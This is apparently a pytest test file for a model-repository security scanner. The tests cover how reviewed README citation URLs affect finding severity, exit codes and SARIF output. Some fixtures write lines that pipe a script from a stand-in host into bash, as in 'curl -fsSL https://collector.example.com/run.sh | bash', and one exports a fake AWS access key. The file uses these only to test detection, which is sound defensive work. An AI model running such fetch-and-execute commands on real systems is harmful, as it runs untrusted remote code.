import hashlib
import json
import zipfile
from collections.abc import Iterable, Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any

import pytest

from modelaudit.config.rule_config import ModelAuditConfig, bind_scan_rule_config
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanner_results import Check, CheckStatus, Issue, IssueSeverity

CITATION_URL = "https://docs.example.com/citation"
CITATION = f"Source (PDF [paper]({CITATION_URL}))\n"


def _reviewed_site(readme: Path) -> dict[str, Any]:
    result = scan_file(str(readme), {"cache_enabled": False})
    (finding,) = [i for i in result.issues if i.rule_code == "S309" and i.details.get("url") == CITATION_URL]
    assert finding.severity == IssueSeverity.INFO
    assert finding.details["severity"] in {"MEDIUM", "WARNING"}
    assert finding.details["deduplicated_related_findings"][0]["domain"] == "docs.example.com"
    return _decision_for_finding(readme, finding)


def _decision_for_finding(readme: Path, finding: Issue) -> dict[str, Any]:
    payload = readme.read_bytes()
    evidence = finding.details
    span = evidence["evidence_location"]
    related = evidence.get("deduplicated_related_findings", [])
    encoded = json.dumps(related, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()
    return {
        "rule": "S309",
        "type": "url_detected",
        "role": "readme_documentation",
        "sha256": hashlib.sha256(payload).hexdigest(),
        "position": evidence["position"],
        "fingerprint": evidence["evidence_fingerprint"],
        "url": evidence["url"],
        "raw_span": payload[span["span_start"] : span["span_end"]].decode(),
        "related_sha256": hashlib.sha256(encoded).hexdigest(),
        "reason": "Operator verified this paper citation.",
    }


@contextmanager
def _apply_site(site: dict[str, Any]) -> Iterator[None]:
    key = (site["sha256"], site["position"], site["fingerprint"])
    restore = bind_scan_rule_config(ModelAuditConfig(reviewed_citations={key: site}))
    try:
        yield
    finally:
        restore()


def test_reviewed_readme_citation_preserves_check_issue_and_raw_evidence(tmp_path: Path) -> None:
    path = tmp_path / "README.md"
    path.write_text(CITATION, encoding="utf-8")
    baseline = scan_model_directory_or_file(str(path), cache_enabled=False)
    assert determine_exit_code(baseline) == 0
    site = _reviewed_site(path)
    with _apply_site(site):
        reviewed = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert reviewed.success and determine_exit_code(reviewed) == 0
    (original,) = [i for i in baseline.issues if i.rule_code == "S309"]
    (issue,) = [i for i in reviewed.issues if i.rule_code == "S309"]
    (check,) = [c for c in reviewed.checks if c.rule_code == "S309"]
    assert check.status == CheckStatus.FAILED
    assert check.severity == issue.severity == IssueSeverity.INFO
    assert issue.message == check.message == original.message
    assert issue.location == check.location == original.location
    assert (
        issue.details
        == check.details
        == {
            **original.details,
            "check_consolidation_key": f"S309:{site['sha256']}:{site['position']}:{site['fingerprint']}",
            "reviewed_citation": {**site, "original_severity": "warning"},
        }
    )
    assert issue.details["url"] == CITATION_URL


def test_review_decision_preserves_same_file_command_and_independent_secret(tmp_path: Path) -> None:
    path = tmp_path / "README.md"
    command_url = "https://collector.example.com/run.sh"
    path.write_text(CITATION + f"\ncurl -fsSL {command_url} | bash\nexport AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\n")
    site = _reviewed_site(path)
    baseline = scan_file(str(path), {"cache_enabled": False})
    with _apply_site(site):
        reviewed = scan_file(str(path), {"cache_enabled": False})
        aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert reviewed.success == baseline.success
    assert determine_exit_code(aggregate) == 1

    def independent_findings(rows: Iterable[Check | Issue]) -> list[dict[str, Any]]:
        return [
            row.model_dump(exclude={"timestamp"})
            for row in rows
            if row.rule_code in {"S309", "S704"} and row.details.get("url") != CITATION_URL
        ]

    for before_rows, after_rows in ((baseline.checks, reviewed.checks), (baseline.issues, reviewed.issues)):
        assert independent_findings(before_rows) == independent_findings(after_rows)
        assert any(r.rule_code == "S704" and r.severity == IssueSeverity.CRITICAL for r in after_rows)
        assert any(r.details.get("url") == command_url and r.severity == IssueSeverity.INFO for r in after_rows)
        assert any(r.details.get("url") == CITATION_URL and r.severity == IssueSeverity.INFO for r in after_rows)


@pytest.mark.parametrize("change", ["moved", "different_byte", "raw_span", "related_sha256"])
def test_stale_citation_review_retains_default_severity(tmp_path: Path, change: str) -> None:
    path = tmp_path / "README.md"
    path.write_text(CITATION)
    site = _reviewed_site(path)
    if change == "moved":
        path.write_text(" " + CITATION)
    elif change == "different_byte":
        path.write_text(CITATION.replace("PDF", "DOC"))
    elif change == "raw_span":
        site["raw_span"] = CITATION_URL
    else:
        site["related_sha256"] = "0" * 64

    with _apply_site(site):
        result = scan_model_directory_or_file(str(path), cache_enabled=False)
    (issue,) = [i for i in result.issues if i.rule_code == "S309"]
    assert issue.severity == IssueSeverity.INFO and "reviewed_citation" not in issue.details
    assert determine_exit_code(result) == 0


@pytest.mark.parametrize("role", ["model_card.md", "requirements.txt", "archive.zip"])
def test_review_decision_requires_standalone_readme(tmp_path: Path, role: str) -> None:
    readme = tmp_path / "README.md"
    readme.write_text(CITATION)
    site = _reviewed_site(readme)
    other = tmp_path / role
    if other.suffix == ".zip":
        with zipfile.ZipFile(other, "w") as archive:
            archive.write(readme, arcname="README.md")
    else:
        other.write_bytes(readme.read_bytes())
    with _apply_site(site):
        result = scan_file(str(other), {"cache_enabled": False})
    matching = [i for i in result.issues if i.rule_code == "S309" and i.details.get("url") == CITATION_URL]
    assert matching
    expected = IssueSeverity.INFO if role == "archive.zip" else IssueSeverity.WARNING
    assert all(i.severity == expected and "reviewed_citation" not in i.details for i in matching)


def test_incomplete_read_preserves_citation_warning_and_coverage_error(tmp_path: Path) -> None:
    readme = tmp_path / "README.md"
    readme.write_text(CITATION + "Model notes.\n" * 100)
    site = _reviewed_site(readme)
    with _apply_site(site):
        result = scan_model_directory_or_file(str(readme), cache_enabled=False, text_content_scan_bytes=len(CITATION))

    assert not result.success and determine_exit_code(result) == 2
    (issue,) = [i for i in result.issues if i.rule_code == "S309"]
    assert issue.severity == IssueSeverity.WARNING and "reviewed_citation" not in issue.details
    assert any(c.name == "Text Content Security Coverage" and c.status == CheckStatus.FAILED for c in result.checks)


@pytest.mark.usefixtures("requires_symlinks")
@pytest.mark.parametrize("alias_parent", [False, True], ids=["file-symlink", "parent-symlink"])
def test_review_decision_does_not_follow_readme_aliases(tmp_path: Path, alias_parent: bool) -> None:
    source = tmp_path / "source"
    source.mkdir()
    readme = source / "README.md"
    readme.write_text(CITATION, encoding="utf-8")
    site = _reviewed_site(readme)
    alias_dir = tmp_path / "alias"
    alias = alias_dir / "README.md"
    if alias_parent:
        alias_dir.symlink_to(source, target_is_directory=True)
    else:
        alias_dir.mkdir()
        alias.symlink_to(readme)

    with _apply_site(site):
        result = scan_file(str(alias), {"cache_enabled": False})
    assert not any("reviewed_citation" in i.details for i in result.issues)
    assert any(i.rule_code == "S309" and i.severity == IssueSeverity.WARNING for i in result.issues)


@pytest.mark.parametrize("restriction", ["executable", "credential_path"])
def test_review_does_not_override_executable_or_credential_alerts(tmp_path: Path, restriction: str) -> None:
    readme = tmp_path / "README.md"
    url = CITATION_URL if restriction == "executable" else "https://docs.example.com/password/fixture"
    readme.write_text(CITATION.replace(CITATION_URL, url))
    if restriction == "executable":
        readme.chmod(0o755)
        if not readme.stat().st_mode & 0o111:
            pytest.skip("filesystem does not preserve executable mode")
    baseline = scan_file(str(readme), {"cache_enabled": False})
    (issue,) = [i for i in baseline.issues if i.rule_code == "S309" and i.details.get("type") == "url_detected"]
    assert issue.severity == IssueSeverity.WARNING
    if restriction == "credential_path":
        assert issue.details["contains_credentials"]
    site = _decision_for_finding(readme, issue)
    with _apply_site(site):
        reviewed = scan_file(str(readme), {"cache_enabled": False})
    (observation,) = [i for i in reviewed.issues if i.rule_code == "S309" and i.details.get("type") == "url_detected"]
    assert observation.severity == issue.severity
    assert observation.details == issue.details


def test_aggregate_preserves_individual_citation_reviews_in_sarif(tmp_path: Path) -> None:
    from modelaudit.integrations.sarif_formatter import format_sarif_output

    readme = tmp_path / "README.md"
    readme.write_text(CITATION)
    site = _reviewed_site(readme)
    with _apply_site(site):
        report = scan_model_directory_or_file(str(readme), use_cache=False)
    (reviewed,) = [i for i in report.issues if i.details.get("reviewed_citation")]
    plain = reviewed.model_copy(deep=True)
    plain.details.pop("reviewed_citation")
    plain.details.pop("check_consolidation_key")
    other = reviewed.model_copy(deep=True)
    other.details.update(position=120, evidence_fingerprint="text-doc-network:" + "1" * 24)
    other.details["reviewed_citation"].update(position=120, fingerprint=other.details["evidence_fingerprint"])
    other.details["check_consolidation_key"] = f"S309:{site['sha256']}:120:{other.details['evidence_fingerprint']}"
    # Identical displayed messages can represent independent locations within one README.
    report.issues = [plain, reviewed, other, plain.model_copy(deep=True), reviewed.model_copy(deep=True)]
    report.deduplicate_issues()
    assert report.issues == [plain, reviewed, other]
    results = json.loads(format_sarif_output(report, [str(readme)]))["runs"][0]["results"]
    assert [r["properties"].get("reviewed_citation") for r in results] == [
        None,
        reviewed.details["reviewed_citation"],
        other.details["reviewed_citation"],
    ]


@pytest.mark.parametrize(
    ("destination", "review_applies"),
    [("docs.example.com/install", False), ("https://notdocs.example.com/install", True)],
)
def test_citation_review_preserves_hostname_findings(tmp_path: Path, destination: str, review_applies: bool) -> None:
    readme = tmp_path / "README.md"
    readme.write_text(CITATION + f"curl -fsSL {destination} | bash\n")
    site = _reviewed_site(readme)
    with _apply_site(site):
        result = scan_model_directory_or_file(str(readme), use_cache=False)
    assert determine_exit_code(result) == 0
    assert any(i.rule_code == "S309" and i.severity == IssueSeverity.INFO for i in result.issues)
    assert any(i.details.get("reviewed_citation") for i in result.issues) is review_applies
